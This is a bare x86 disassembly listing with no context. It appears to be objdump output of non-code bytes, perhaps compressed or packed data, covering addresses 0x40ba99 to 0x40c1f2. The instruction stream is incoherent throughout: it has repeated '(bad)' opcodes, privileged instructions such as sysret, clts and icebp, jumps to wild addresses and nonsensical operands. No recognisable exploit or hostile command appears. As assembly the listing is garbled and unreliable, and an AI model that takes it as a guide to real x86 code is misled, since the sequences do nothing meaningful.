  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
  40bb5a:	mov    DWORD PTR [esi],eax
  40bb5c:	mov    es,esi
  40bb5e:	push   ecx
  40bb5f:	ret    0x166
  40bb62:	push   ebp
  40bb63:	pop    esi
  40bb64:	leavew 
  40bb66:	inc    ebp
  40bb67:	sbb    BYTE PTR [ebp-0x76132cab],cl
  40bb6d:	in     al,dx
  40bb6e:	xchg   esp,eax
  40bb6f:	push   esi
  40bb70:	shl    al,0x66
  40bb73:	add    DWORD PTR [ebp+0x1],0x38e1008d
  40bb7a:	mov    DWORD PTR [edi],ecx
  40bb7c:	cwde   
  40bb7d:	or     cl,BYTE PTR [ecx-0x767a6600]
  40bb83:	setl   BYTE PTR [edx]
  40bb86:	inc    ebp
  40bb87:	add    BYTE PTR [edi],cl
  40bb89:	test   DWORD PTR [ebp+0xf],ecx
  40bb8c:	xor    edi,edx
  40bb8e:	add    eax,DWORD PTR [eax]
  40bb90:	xor    ecx,DWORD PTR [ebx+0x458866]
  40bb96:	mov    eax,DWORD PTR [ebp-0x1848f010]
  40bb9c:	test   al,0x0
  40bb9e:	mov    BYTE PTR [ebx+0xc18cc3],0x89
  40bba5:	adc    BYTE PTR [eax-0x76ff3f7c],ch
  40bbab:	add    BYTE PTR [eax-0x57f076aa],ch
  40bbb1:	rol    DWORD PTR [ebp+0x0],1
  40bbb4:	mov    ecx,DWORD PTR [ebx+0x758cf0]
  40bbba:	inc    DWORD PTR [ebx-0x748a0fe8]
  40bbc0:	jmp    FWORD PTR [ebx]
  40bbc2:	adc    BYTE PTR [ebx],al
  40bbc4:	jne    0x40bbd5
  40bbc6:	call   DWORD PTR [eax-0x14]
  40bbc9:	mov    DWORD PTR [edi-0x1c],edi
  40bbcc:	push   DWORD PTR [edi-0x35e3f1ff]
  40bbd2:	inc    ebp
  40bbd3:	test   BYTE PTR [ebx-0x47ffe400],cl
  40bbd9:	dec    eax
  40bbda:	add    DWORD PTR [ebx+0x0],edx
  40bbdd:	dec    ebp
  40bbde:	inc    ebp
  40bbdf:	mov    esi,0x7f8cff8b
  40bbe4:	add    BYTE PTR [ebp-0x74728b75],al
  40bbea:	add    al,0x83
  40bbec:	adc    esp,esi
  40bbee:	(bad)  
  40bbef:	and    edx,DWORD PTR ds:0x780f0703
  40bbf5:	jp     0x40bb82
  40bbf7:	sysret 
  40bbf9:	pop    edx
  40bbfa:	add    eax,DWORD PTR [ebx]
  40bbfc:	cmp    esi,DWORD PTR [ebx+esi*2-0x73]
  40bc00:	sub    edx,DWORD PTR [ebx+eax*1]
  40bc03:	dec    ebp
  40bc04:	mov    DWORD PTR [ebp-0x74a48ba1],eax
  40bc0a:	ret    0x83
  40bc0d:	clc    
  40bc0e:	mov    esp,DWORD PTR [ebx]
  40bc10:	add    DWORD PTR [ebx],0x1c
  40bc13:	jnp    0x90504792
  40bc19:	pop    ecx
  40bc1a:	add    BYTE PTR [ebx],al
  40bc1c:	xor    DWORD PTR [eax+eax*1-0x73],0xffffff84
  40bc21:	adc    al,0x1
  40bc23:	jge    0x40bc25
  40bc25:	mov    edx,edx
  40bc27:	cld    
  40bc28:	test   BYTE PTR [edi],bh
  40bc2a:	add    edi,edi
  40bc2c:	add    BYTE PTR [esi],al
  40bc2e:	neg    BYTE PTR [ebp-0x7c]
  40bc31:	add    DWORD PTR [eax],eax
  40bc33:	pop    es
  40bc34:	add    BYTE PTR [edi-0x48fff17a],dh
  40bc3a:	add    BYTE PTR [eax+eax*8],cl
  40bc3d:	inc    ebp
  40bc3e:	test   BYTE PTR [ebx+0x300fc00],al
  40bc44:	mov    esi,0xf80039
  40bc49:	fisttp DWORD PTR [edi]
  40bc4b:	mov    bh,0xda
  40bc4d:	push   cs
  40bc4e:	add    BYTE PTR [edi+0x4d340c39],dh
  40bc54:	test   bh,bh
  40bc56:	add    ah,dh
  40bc58:	add    cl,al
  40bc5a:	mov    cl,0x3
  40bc5c:	add    DWORD PTR [ecx+0x7d65ec00],ecx
  40bc62:	add    BYTE PTR [edx-0x36],dh
  40bc65:	mov    ecx,DWORD PTR [esi]
  40bc67:	call   0xef8742e
  40bc6c:	or     al,0xb7
  40bc6e:	dec    ebp
  40bc6f:	or     al,0xf
  40bc71:	inc    ebp
  40bc72:	dec    eax
  40bc73:	add    DWORD PTR [ebx],0x8
  40bc76:	(bad)  
  40bc78:	scas   al,BYTE PTR es:[edi]
  40bc79:	dec    ebp
  40bc7a:	add    BYTE PTR [ecx],bh
  40bc7c:	(bad)  
  40bc7d:	lock adc al,0x82
  40bc80:	mov    edi,edi
  40bc82:	call   0xff9cbc86
  40bc87:	rcl    BYTE PTR [edi-0x15],0x31
  40bc8b:	xor    edi,DWORD PTR [edi+0x5e]
  40bc8e:	adc    ebx,eax
  40bc90:	mov    eax,DWORD PTR gs:[eax]
  40bc93:	mov    edx,esi
  40bc95:	nop
  40bc96:	rol    BYTE PTR [eax],1
  40bc98:	mov    bh,0x83
  40bc9a:	push   cs
  40bc9b:	or     al,0xb7
  40bc9d:	xor    ecx,DWORD PTR [esi+edx*2]
  40bca0:	sti    
  40bca1:	cmp    DWORD PTR [ecx+0xf],ebp
  40bca4:	dec    edx
  40bca5:	test   DWORD PTR [ecx+0x318bec00],ecx
  40bcab:	or     al,0x41
  40bcad:	ret    
  40bcae:	or     DWORD PTR [esi+0x65],edi
  40bcb1:	pop    eax
  40bcb2:	add    BYTE PTR [ebp-0x32],dh
  40bcb5:	xor    ecx,eax
  40bcb7:	inc    eax
  40bcb8:	mov    bh,0x76
  40bcba:	push   cs
  40bcbb:	inc    eax
  40bcbc:	mov    bh,0x3
  40bcbe:	or     al,0x8
  40bcc0:	sti    
  40bcc1:	dec    eax
  40bcc2:	sub    ecx,DWORD PTR [ebx+0x70892479]
  40bcc8:	cld    
  40bcc9:	mov    edi,DWORD PTR [ebp+0x18]
  40bccc:	mov    ecx,DWORD PTR [ebp-0x7b]
  40bccf:	add    esi,DWORD PTR [eax+ecx*1-0x75]
  40bcd3:	jne    0x40bcb9
  40bcd5:	cmp    ebx,DWORD PTR [edi+esi*2]
  40bcd8:	jns    0xff50b957
  40bcde:	pop    ecx
  40bcdf:	jge    0x40bce0
  40bce1:	cmp    eax,edi
  40bce3:	cld    
  40bce4:	inc    ebp
  40bce5:	iret   
  40bce6:	or     BYTE PTR [eax-0x5],bh
  40bce9:	jae    0x40bd68
  40bceb:	(bad)  
  40bced:	xor    al,0xf
  40bcef:	jmp    0x40bd6b
  40bcf1:	mov    ecx,DWORD PTR [edi]
  40bcf3:	lea    ebx,[edx-0x4f]
  40bcf6:	mov    esi,DWORD PTR [ebx]
  40bcf8:	in     al,dx
  40bcf9:	test   BYTE PTR [ebp+0x27],0x83
  40bcfd:	jge    0x40bd07
  40bcff:	add    edi,ebx
  40bd01:	mov    DWORD PTR [ebp-0x8],ecx
  40bd04:	cmp    eax,edi
  40bd06:	hlt    
  40bd07:	adc    ah,BYTE PTR [eax+0xf8b4d7d]
  40bd0d:	jl     0x40bd5f
  40bd0f:	clc    
  40bd10:	(bad)  
  40bd12:	js     0x40bc9f
  40bd14:	push   DWORD PTR [edx-0x10]
  40bd17:	mov    eax,ecx
  40bd19:	clc    
  40bd1a:	add    edi,edi
  40bd1c:	mov    DWORD PTR [eax],edx
  40bd1e:	call   0xfbe125e
  40bd23:	inc    edi
  40bd24:	popa   
  40bd25:	jge    0x40bd26
  40bd27:	cmp    ebx,DWORD PTR [edi-0x4]
  40bd2a:	xor    edi,DWORD PTR [edx-0x3ffd78c0]
  40bd30:	rcr    BYTE PTR [esi-0x37],0xc9
  40bd34:	push   ebp
  40bd35:	or     ah,ch
  40bd37:	push   ebp
  40bd38:	sub    ah,0x1
  40bd3b:	in     al,dx
  40bd3c:	add    BYTE PTR [edx-0x7ac7a14],bh
  40bd42:	fist   DWORD PTR [ebp+0x57]
  40bd45:	(bad)  
  40bd46:	sbb    al,bh
  40bd48:	test   BYTE PTR [ebp+0x4500f800],al
  40bd4e:	inc    ebp
  40bd4f:	mov    edi,DWORD PTR [ebx]
  40bd51:	cld    
  40bd52:	je     0x40bda1
  40bd54:	cmp    DWORD PTR [ebx+0x4d05fc78],ecx
  40bd5a:	ror    BYTE PTR [ebx-0x74740315],0x78
  40bd61:	adc    BYTE PTR [ebp-0x42],al
  40bd64:	mov    ecx,DWORD PTR [eax]
  40bd66:	sbb    al,0x7
  40bd68:	push   eax
  40bd69:	inc    ebp
  40bd6a:	mov    ecx,DWORD PTR [edi-0x7487adec]
  40bd70:	add    edi,esp
  40bd72:	or     BYTE PTR [ebx+0x890155],bl
  40bd78:	cld    
  40bd79:	mov    edi,0x372f7
  40bd7e:	jge    0x40bd4e
  40bd80:	xor    eax,esi
  40bd82:	mov    edi,eax
  40bd84:	hlt    
  40bd85:	iret   
  40bd86:	pop    ebp
  40bd87:	inc    ebp
  40bd88:	jbe    0x40bdc5
  40bd8a:	cmp    ecx,DWORD PTR [edi]
  40bd8c:	adc    al,0x7b
  40bd8e:	push   es
  40bd8f:	add    BYTE PTR [edi+0x2fc7a8b],dh
  40bd95:	dec    ebp
  40bd96:	div    DWORD PTR [ebx]
  40bd98:	sbb    al,0x3
  40bd9a:	mov    edi,DWORD PTR [ebx]
  40bd9c:	test   DWORD PTR [edi],ecx
  40bd9e:	je     0x40be09
  40bda0:	mov    eax,DWORD PTR [eax]
  40bda2:	or     BYTE PTR [ebx-0x76820302],cl
  40bda8:	cmp    eax,DWORD PTR [eax]
  40bdaa:	jbe    0x40bdac
  40bdac:	mov    ebx,esi
  40bdae:	or     al,0xdf
  40bdb0:	jg     0x40bd7d
  40bdb2:	add    eax,DWORD PTR [ecx+edi*1-0x1ff07fe]
  40bdb9:	dec    ebp
  40bdba:	add    ecx,DWORD PTR [ecx-0x257a2b83]
  40bdc0:	je     0x40bda0
  40bdc2:	mov    edi,ebx
  40bdc4:	mov    ebx,DWORD PTR [ebp-0xc]
  40bdc7:	mov    ecx,DWORD PTR [ecx+0x7ddaf4f0]
  40bdcd:	adc    dh,BYTE PTR [edx+0x55]
  40bdd0:	jmp    0x40bd5d
  40bdd2:	xor    edi,esp
  40bdd4:	pop    edi
  40bdd5:	rcr    BYTE PTR [ebx+0x33],cl
  40bdd8:	ret    0x3
  40bddb:	cmp    DWORD PTR [ebx+0x2c17830a],ecx
  40bde1:	push   ebp
  40bde2:	xor    eax,0x89fc9c8b
  40bde7:	sar    ah,cl
  40bde9:	xor    eax,DWORD PTR [ebp+0x3]
  40bdec:	xor    al,0x39
  40bdee:	pushf  
  40bdef:	or     cl,BYTE PTR [ebx+0x4d02fc0f]
  40bdf5:	add    BYTE PTR [ebx+0x4dfcfc8b],cl
  40bdfb:	pop    ebp
  40bdfc:	mov    ecx,DWORD PTR [ebx-0x3fb20f04]
  40be02:	push   ebx
  40be03:	add    ebx,DWORD PTR [ebp-0x75]
  40be06:	push   esi
  40be07:	adc    BYTE PTR [edi+0x4d],dl
  40be0a:	push   ecx
  40be0b:	xor    eax,edi
  40be0d:	mov    eax,esi
  40be0f:	in     al,0xeb
  40be11:	dec    ebp
  40be12:	add    ecx,DWORD PTR [ebx-0x317403b3]
  40be18:	nop
  40be19:	iret   
  40be1a:	add    dh,dl
  40be1c:	push   edi
  40be1d:	dec    ebp
  40be1e:	sahf   
  40be1f:	mov    esi,DWORD PTR [edx]
  40be21:	add    esi,DWORD PTR [ebx]
  40be23:	add    esi,DWORD PTR [ebx]
  40be25:	cmp    eax,DWORD PTR [ebx]
  40be27:	je     0x40be2c
  40be29:	add    ecx,DWORD PTR [ecx+0xb4de808]
  40be2f:	mov    eax,DWORD PTR [esp+edi*8+0x4800ce02]
  40be36:	pop    ebp
  40be37:	mov    ecx,DWORD PTR [ebx-0x217bf3f8]
  40be3d:	sahf   
  40be3e:	fbstp  TBYTE PTR [edx]
  40be40:	(bad)  [ecx+0x45020c84]
  40be46:	add    BYTE PTR [eax],dh
  40be48:	pop    ebp
  40be49:	pushf  
  40be4a:	mov    ecx,DWORD PTR [ebx+0x75001080]
  40be50:	xor    ecx,DWORD PTR [ebx+0x3bd803]
  40be56:	ud0    ecx,DWORD PTR [edi-0x75]
  40be5a:	add    ah,bh
  40be5c:	add    ecx,esi
  40be5e:	or     bh,cl
  40be60:	dec    ebp
  40be61:	inc    ebp
  40be62:	mov    edi,DWORD PTR [ebx]
  40be64:	xor    esi,DWORD PTR [ebp+0x3]
  40be67:	mov    ecx,DWORD PTR [ecx+0x5d75f010]
  40be6d:	mov    edi,DWORD PTR [ebx]
  40be6f:	fdiv   DWORD PTR [eax+eax*1-0x75]
  40be73:	push   eax
  40be75:	or     al,0x5d
  40be77:	inc    ebp
  40be78:	imul   eax,edi,0x14
  40be7b:	loopne 0x40be5b
  40be7d:	sbb    ebx,edi
  40be7f:	jg     0x40be9d
  40be81:	inc    ebp
  40be82:	jne    0x40bea0
  40be84:	mov    ebx,DWORD PTR [eax+esi*8+0x6bfc5d8b]
  40be8b:	(bad)  
  40be8c:	adc    al,0xc7
  40be8e:	fiadd  WORD PTR [ebp-0x21]
  40be91:	jne    0x40beef
  40be93:	mov    edx,DWORD PTR [eax]
  40be95:	clc    
  40be96:	test   BYTE PTR [ebp+0x2],cl
  40be99:	xor    eax,DWORD PTR [eax]
  40be9b:	xor    eax,DWORD PTR [ebp-0x73]
  40be9e:	mov    eax,DWORD PTR [ebx]
  40bea0:	cld    
  40bea1:	jb     0x40bee8
  40bea3:	add    BYTE PTR [ebx+0x45],ch
  40bea6:	adc    al,0x8b
  40bea8:	rcr    eax,0x48
  40beab:	add    BYTE PTR [ebx],al
  40bead:	add    ecx,DWORD PTR [eax]
  40beaf:	pmaxub mm1,mm3
  40beb2:	dec    ebp
  40beb3:	dec    DWORD PTR [ebx+0x5545fc24]
  40beb9:	xor    esi,DWORD PTR [ebx]
  40bebb:	add    eax,DWORD PTR [ebx]
  40bebd:	cmp    esi,DWORD PTR [ebx]
  40bebf:	hlt    
  40bec0:	mov    DWORD PTR [edi],ecx
  40bec2:	fadd   QWORD PTR [ebp+0x8]
  40bec5:	xor    edx,edi
  40bec7:	add    ebx,edi
  40bec9:	cmp    ecx,edx
  40becb:	clts   
  40becd:	jp     0x40bf1c
  40becf:	dec    DWORD PTR [ecx+0x4dfcdc8b]
  40bed5:	(bad)  
  40bed6:	xor    eax,edi
  40bed8:	add    eax,DWORD PTR [ebp+0xc]
  40bedb:	jne    0x40bf22
  40bedd:	mov    ecx,DWORD PTR [ebp+0x724d01f8]
  40bee3:	xor    eax,DWORD PTR [eax]
  40bee5:	lea    eax,[ebp+0x1]
  40bee8:	(bad)  
  40bee9:	jb     0x40bec3
  40beeb:	add    BYTE PTR [ebp+0x45e9f845],al
  40bef1:	add    bh,bh
  40bef3:	add    BYTE PTR [eax*2+0x12018d80],cl
  40befa:	add    bh,al
  40befc:	adc    BYTE PTR [ecx*2+0x30e332d],cl
  40bf03:	pop    ebp
  40bf04:	mov    DWORD PTR [ebx],esi
  40bf06:	hlt    
  40bf07:	add    ecx,eax
  40bf09:	jmp    0x85bf20
  40bf0e:	inc    DWORD PTR [ebp+0xc]
  40bf11:	xor    eax,DWORD PTR [eax+0x890103]
  40bf17:	in     al,dx
  40bf18:	push   eax
  40bf19:	inc    ebp
  40bf1a:	mov    DWORD PTR [ebx],esi
  40bf1c:	hlt    
  40bf1d:	add    eax,DWORD PTR [ebp-0x77]
  40bf20:	mov    WORD PTR [esi+eiz*2],cs
  40bf23:	dec    ebp
  40bf24:	(bad)  
  40bf25:	mov    esp,eax
  40bf27:	fcomp  QWORD PTR [ecx+0x45cff8ce]
  40bf2d:	enter  0x633,0x3
  40bf31:	add    al,0x3b
  40bf33:	mov    esp,esi
  40bf35:	in     al,dx
  40bf36:	and    eax,DWORD PTR [ebp+0x45]
  40bf39:	mov    ecx,DWORD PTR [ebx-0x39ba1f68]
  40bf3f:	mov    ecx,esi
  40bf41:	cld    
  40bf42:	pushf  
  40bf43:	dec    ebp
  40bf44:	sahf   
  40bf45:	xor    esi,DWORD PTR [edx]
  40bf47:	add    ecx,DWORD PTR [ebx-0x7f8befc5]
  40bf4d:	mov    eax,DWORD PTR [ecx]
  40bf4f:	cld    
  40bf50:	add    BYTE PTR [ebp-0x31],cl
  40bf53:	xor    ebp,DWORD PTR [edi+0x50c15103]
  40bf59:	pop    ds
  40bf5a:	mov    eax,ecx
  40bf5c:	cld    
  40bf5d:	sbb    dh,al
  40bf5f:	dec    ebp
  40bf60:	(bad)  
  40bf61:	mov    eax,DWORD PTR [ebp+0x10]
  40bf64:	jne    0x40bee6
  40bf66:	mov    eax,DWORD PTR [ecx]
  40bf68:	fadd   DWORD PTR [eax]
  40bf6a:	(bad)  
  40bf6b:	mov    bh,0xc7
  40bf6d:	push   ecx
  40bf6e:	fdiv   DWORD PTR [ebp-0x7a]
  40bf71:	(bad)  
  40bf72:	dec    DWORD PTR [eax]
  40bf74:	call   FWORD PTR [ecx]
  40bf76:	inc    ebp
  40bf77:	inc    ebp
  40bf78:	xor    eax,DWORD PTR [ebx]
  40bf7a:	add    ecx,DWORD PTR [eax]
  40bf7c:	cmp    ecx,DWORD PTR [ebp-0xc]
  40bf7f:	mov    edx,DWORD PTR [edi]
  40bf81:	fadd   DWORD PTR [ebp+0x0]
  40bf84:	mov    eax,DWORD PTR [ebx-0x39fd18]
  40bf8a:	test   ah,dh
  40bf8c:	sahf   
  40bf8d:	push   ecx
  40bf8e:	xor    cl,BYTE PTR [ecx+0x45e80c89]
  40bf94:	out    dx,eax
  40bf95:	mov    eax,DWORD PTR [eax]
  40bf97:	or     al,0xc7
  40bf99:	(bad)  
  40bf9a:	in     al,dx
  40bf9b:	(bad)  
  40bf9c:	sbb    eax,ecx
  40bf9e:	add    DWORD PTR [ebp+0x45],eax
  40bfa1:	jne    0x40bf32
  40bfa3:	mov    eax,DWORD PTR [eax+ebp*8]
  40bfa6:	mov    eax,esi
  40bfa8:	cld    
  40bfa9:	test   dh,bl
  40bfab:	sahf   
  40bfac:	fbstp  TBYTE PTR [edx]
  40bfae:	ret    0x89
  40bfb1:	call   0x4e3cd041
  40bfb6:	(bad)  
  40bfb7:	xor    eax,edi
  40bfb9:	add    eax,DWORD PTR [ebp+0xf]
  40bfbc:	mov    eax,ecx
  40bfbe:	cld    
  40bfbf:	dec    ebp
  40bfc0:	(bad)  
  40bfc1:	mov    edi,eax
  40bfc3:	cdq    
  40bfc4:	inc    ebp
  40bfc5:	inc    ebp
  40bfc6:	mov    esi,DWORD PTR [ebx]
  40bfc8:	cld    
  40bfc9:	lea    eax,[ebp+0x3]
  40bfcc:	xor    esi,DWORD PTR [edx+0x3]
  40bfcf:	add    BYTE PTR [ebx],bh
  40bfd1:	inc    ebp
  40bfd2:	je     0x40bf5f
  40bfd4:	mov    esp,esp
  40bfd6:	cwde   
  40bfd7:	mov    BYTE PTR [ebp-0x39],0x8b
  40bfdb:	add    al,0xe4
  40bfdd:	(bad)  
  40bfdf:	sub    ecx,DWORD PTR [ecx+0x458b0cff]
  40bfe5:	lock mov eax,DWORD PTR [ebp-0x14]
  40bfe9:	mov    eax,esi
  40bfeb:	aam    0xc7
  40bfed:	jmp    0xd645:0x2972c1
  40bff4:	mov    eax,ebp
  40bff6:	in     al,dx
  40bff7:	inc    esi
  40bff9:	mov    eax,edi
  40bffb:	cld    
  40bffc:	jmp    0x750ffbcf
  40c001:	ror    DWORD PTR [ebx+0x4575ec45],0x8b
  40c008:	mov    edi,eax
  40c00a:	fadd   DWORD PTR [ebx]
  40c00c:	add    BYTE PTR [ebp+0xf],al
  40c00f:	xor    ecx,ecx
  40c011:	add    edi,edi
  40c013:	pop    edi
  40c014:	hlt    
  40c015:	pop    ebx
  40c016:	push   eax
  40c017:	ret    0xeb
  40c01a:	mov    ecx,DWORD PTR [ebx+0x2845830c]
  40c020:	mov    eax,DWORD PTR [ebp+0x10]
  40c023:	xor    eax,0xc7019c89
  40c028:	add    al,bl
  40c02a:	rol    BYTE PTR [ebp+0x4575f850],0xff
  40c031:	mov    DWORD PTR [eax],ecx
  40c033:	or     al,0x45
  40c035:	inc    ebp
  40c036:	mov    edi,DWORD PTR [ecx+0x74d08fc]
  40c03c:	xor    eax,ecx
  40c03e:	add    ebx,DWORD PTR [esi+0x568b323b]
  40c044:	clc    
  40c045:	jne    0x40c058
  40c047:	add    ecx,DWORD PTR [ebp+0x3b]
  40c04a:	xor    ecx,DWORD PTR [edi]
  40c04c:	lea    esp,[ecx]
  40c04e:	add    DWORD PTR [eax],eax
  40c050:	jb     0x40bfdd
  40c052:	add    BYTE PTR [eax],cl
  40c054:	inc    ebp
  40c055:	jne    0x40c042
  40c057:	add    ecx,DWORD PTR [ebx-0x3976f3c4]
  40c05d:	or     al,0xc7
  40c05f:	inc    ebp
  40c060:	scas   eax,DWORD PTR es:[edi]
  40c061:	xor    BYTE PTR [ebx+0x48be49c],cl
  40c067:	in     al,0x8b
  40c069:	jne    0x40c063
  40c06b:	mov    eax,esi
  40c06d:	or     al,0x9c
  40c06f:	icebp  
  40c070:	sahf   
  40c071:	shl    DWORD PTR [edx],0xf2
  40c074:	mov    esi,DWORD PTR [esp+edi*8+0x33934d68]
  40c07b:	lsl    ebp,bx
  40c07e:	cmp    DWORD PTR [eax],eax
  40c080:	cdq    
  40c081:	mov    eax,DWORD PTR [ebp-0xba00f4]
  40c087:	add    edx,DWORD PTR [ebp-0x60]
  40c08a:	mov    eax,DWORD PTR [eax]
  40c08c:	call   0x81490e1c
  40c091:	jge    0x40c030
  40c093:	sub    esi,DWORD PTR [edx]
  40c095:	xor    al,0x33
  40c097:	jge    0x40c082
  40c099:	xor    edi,ebp
  40c09b:	add    edi,edi
  40c09d:	mov    DWORD PTR [ebp-0x24],ecx
  40c0a0:	xor    esi,edi
  40c0a2:	add    eax,DWORD PTR [ebx+edi*1-0x3ff7500]
  40c0a9:	jne    0x40c0b3
  40c0ab:	xor    eax,DWORD PTR [ebp+0x3]
  40c0ae:	jmp    0x40c039
  40c0b0:	mov    edi,eax
  40c0b2:	cld    
  40c0b3:	mov    esi,0x5e85c7f0
  40c0b9:	clc    
  40c0ba:	leave  
  40c0bb:	xchg   edi,eax
  40c0bc:	or     al,0x0
  40c0be:	push   ebp
  40c0bf:	mov    ebp,esp
  40c0c1:	cld    
  40c0c2:	in     al,dx
  40c0c3:	icebp  
  40c0c4:	(bad)  
  40c0c5:	jnp    0x40c0c3
  40c0c7:	add    eax,DWORD PTR [ebp+0x453bf8d1]
  40c0cd:	jae    0x40c103
  40c0cf:	sub    ebx,DWORD PTR [ebp+ecx*4-0x76f38f75]
  40c0d6:	inc    ebp
  40c0d7:	call   0x823d7867
  40c0dc:	push   edi
  40c0dd:	call   DWORD PTR [ecx+0x0]
  40c0e0:	xor    ecx,DWORD PTR [ecx+0x7d72ecba]
  40c0e6:	add    BYTE PTR [ebx+0x3082b8b],cl
  40c0ec:	ret    0xf00f
  40c0ef:	xor    eax,DWORD PTR [esi+ebp*8-0x76ffccff]
  40c0f6:	inc    ebp
  40c0f7:	loopne 0x40c084
  40c0f9:	jne    0x40c103
  40c0fb:	mov    esi,DWORD PTR [eax-0x20]
  40c0fe:	push   edi
  40c0ff:	jge    0x40c176
  40c101:	xor    eax,edi
  40c103:	(bad)  
  40c104:	in     al,0x3e
  40c106:	test   DWORD PTR [edx-0x8],esi
  40c109:	add    BYTE PTR [ebp+0x75],al
  40c10c:	mov    ecx,DWORD PTR [ebx+0x7d7df0fc]
  40c112:	xor    esi,DWORD PTR [ebx]
  40c114:	xor    eax,DWORD PTR [ebx]
  40c116:	add    edi,DWORD PTR [ebx]
  40c118:	cmp    DWORD PTR [ebp-0x39],esi
  40c11b:	mov    edx,DWORD PTR [ebp-0x7b82fe10]
  40c121:	xor    eax,DWORD PTR [eax]
  40c123:	add    eax,DWORD PTR [eax]
  40c125:	cmp    esi,DWORD PTR [ebp+0x75]
  40c128:	mov    ecx,DWORD PTR [ebx+0x7d86e008]
  40c12e:	add    BYTE PTR [ecx],al
  40c130:	add    BYTE PTR [ebx+0x4d8b0275],al
  40c136:	or     al,0x75
  40c138:	ja     0x40c0c5
  40c13a:	mov    esi,esp
  40c13c:	cld    
  40c13d:	pop    ebp
  40c13e:	stc    
  40c13f:	mov    edi,edx
  40c141:	in     al,0x75
  40c143:	jge    0x40c180
  40c145:	mov    ecx,DWORD PTR [edi]
  40c147:	or     al,0xc4
  40c149:	icebp  
  40c14a:	add    BYTE PTR [ebx+ecx*4-0xe6c0394],bh
  40c151:	jae    0x40c145
  40c153:	add    esi,DWORD PTR [ebp-0xc]
  40c156:	push   ebx
  40c157:	jne    0x40c19e
  40c159:	mov    esi,DWORD PTR [edx]
  40c15b:	add    al,0x9c
  40c15d:	icebp  
  40c15e:	jmp    0x9dc255
  40c163:	cmp    esi,DWORD PTR [ebp+0xf]
  40c166:	xor    edx,DWORD PTR [ebp+ecx*4-0x1]
  40c16a:	clc    
  40c16b:	pop    ebx
  40c16c:	repnz inc ebp
  40c16e:	out    dx,eax
  40c16f:	pop    edi
  40c170:	test   DWORD PTR [ebx],0x33fe456d
  40c176:	pop    esp
  40c177:	add    ecx,DWORD PTR [eax]
  40c179:	pop    esi
  40c17a:	jge    0x40c13e
  40c17c:	(bad)  
  40c17e:	xor    ecx,DWORD PTR [ebx+0x540f83e6]
  40c184:	add    BYTE PTR [ebp+0x75],al
  40c187:	xor    eax,0xc7ec9c8b
  40c18c:	xor    ah,bl
  40c18e:	repnz test esi,edi
  40c191:	clc    
  40c192:	mov    bh,0x45
  40c194:	rcl    DWORD PTR [ebx+0xc],0xbe
  40c198:	stc    
  40c199:	or     BYTE PTR [ebp+0x7],bh
  40c19c:	mov    esi,eax
  40c19e:	in     al,dx
  40c19f:	sahf   
  40c1a0:	jne    0x40c1d4
  40c1a2:	mov    eax,DWORD PTR [ebx]
  40c1a4:	or     BYTE PTR [ecx+0x45b4e8f1],cl
  40c1aa:	sahf   
  40c1ab:	xor    esi,DWORD PTR [edx]
  40c1ad:	add    ecx,DWORD PTR [ecx+0x75e0e089]
  40c1b3:	mov    ecx,DWORD PTR [ebx-0xeba13e0]
  40c1b9:	mov    esi,edx
  40c1bb:	lock inc cl
  40c1be:	push   ss
  40c1bf:	inc    ebp
  40c1c0:	jne    0x40c143
  40c1c2:	mov    esi,eax
  40c1c4:	in     al,dx
  40c1c5:	mov    ch,0xf1
  40c1c7:	clc    
  40c1c8:	repnz inc ebp
  40c1ca:	dec    BYTE PTR [ebx-0x3e8a07f8]
  40c1d0:	mov    eax,DWORD PTR [ebp-0x24]
  40c1d3:	cmp    DWORD PTR [esi],0xff85c3f8
  40c1d9:	clc    
  40c1da:	call   0x5dcc6124
  40c1df:	hlt    
  40c1e0:	add    ecx,eax
  40c1e2:	clc    
  40c1e3:	inc    ebp
  40c1e4:	jne    0x40c167
  40c1e6:	mov    esi,esp
  40c1e8:	clc    
  40c1e9:	test   DWORD PTR [ebp-0x8],ebx
  40c1ec:	xor    eax,DWORD PTR [ebp+0x3b]
  40c1ef:	mov    esi,ebx
  40c1f1:	in     al,dx
  40c1f2:	xchg   ebp,eax
